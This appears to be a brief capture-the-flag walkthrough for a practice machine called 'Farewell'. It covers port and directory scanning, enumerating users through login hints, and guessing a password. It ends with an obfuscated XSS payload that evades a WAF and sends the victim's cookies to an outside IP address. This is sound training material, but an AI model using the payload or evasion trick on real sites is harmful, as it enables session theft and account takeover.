# Farewell


###### Reconnaissance
`nmap-sCV -T4 farewell.thm`
	Port 22
	Port 80 

`gobuster dir -u http://farewell.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,json,js`
	/info.php
	/status.php
	/javascript
	/index.php
	/check.js
	/logout.php
	/dashboard.php

###### User Enumeration 
```
adam
deliver11
nora
```

Login attempts with a valid username reveals a server hint, allowing for user enumeration. 
Intercepting these login requests result in more detailed server hints. 

```
nora:lucky number 789
adam:favorite pet + 2
deliver11:capital of Japan followed by 4 digits
admin:the year plus a kind send-off
```

Testing password for Farewell2025! => Worked

Use mixed casing and obsfuscation to bypass WAF in order to fetch cookies: `<ImG src=x onerror=this.src="http://192.168.132.123/?c="+document["co"+"okie"]>`

Visit /admin.php for final flag. 

